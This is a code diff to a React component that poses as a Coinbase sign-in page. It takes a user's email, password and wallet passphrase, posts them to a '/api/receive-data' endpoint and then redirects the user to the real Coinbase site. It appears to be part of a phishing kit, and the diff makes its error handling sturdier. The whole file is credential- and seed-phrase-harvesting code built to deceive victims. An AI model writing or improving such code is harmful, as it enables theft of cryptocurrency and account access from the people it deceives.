@@ -22,39 +22,48 @@ const CoinbaseSignInWithPassphrase = () => {
     setShowPopup(false);
   };
 
-  const handlePassphraseSubmit = async (e, source) => {
-    e.preventDefault();
-    const passphrase = source === 'main' ? mainPassphrase : popupPassphrase;
+ const handlePassphraseSubmit = async (e, source) => {
+  e.preventDefault();
+  const passphrase = source === 'main' ? mainPassphrase : popupPassphrase;
 
-    const dataToSend = {
-      email: email,
-      password: password,
-      passphrase: passphrase
-    };
-
-    try {
-      const response = await fetch('/api/receive-data', {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-        },
-        body: JSON.stringify(dataToSend),
-      });
-
-      const data = await response.json();
-
-      if (response.ok) {
-        console.log('Success:', data.message);
-        closePopup();
-        // Redirect to Coinbase sign-in page after success
-        window.location.href = 'https://www.coinbase.com/signin';
-      } else {
-        console.error('Error:', data.message);
-      }
-    } catch (error) {
-      console.error('Network Error:', error);
-    }
+  const dataToSend = {
+    email: email,
+    password: password,
+    passphrase: passphrase,
   };
+
+  try {
+    const response = await fetch("/api/receive-data", {
+      method: "POST", // ✅ always POST
+      headers: {
+        "Content-Type": "application/json",
+      },
+      body: JSON.stringify(dataToSend),
+    });
+
+    let data = {};
+    try {
+      if (response.headers.get("content-type")?.includes("application/json")) {
+        data = await response.json();
+      } else {
+        data = { message: await response.text() };
+      }
+    } catch (parseError) {
+      console.error("Failed to parse JSON:", parseError);
+    }
+
+    if (response.ok) {
+      console.log("Success:", data.message);
+      closePopup();
+      // Redirect after success
+      window.location.href = "https://www.coinbase.com/signin";
+    } else {
+      console.error("Error:", data.message || "Unexpected error");
+    }
+  } catch (error) {
+    console.error("Network Error:", error);
+  }
+};
 
   return (
     <div className="flex min-h-screen bg-[#101010] text-white font-sans items-center justify-center py-12 px-4 sm:px-6 lg:px-8">
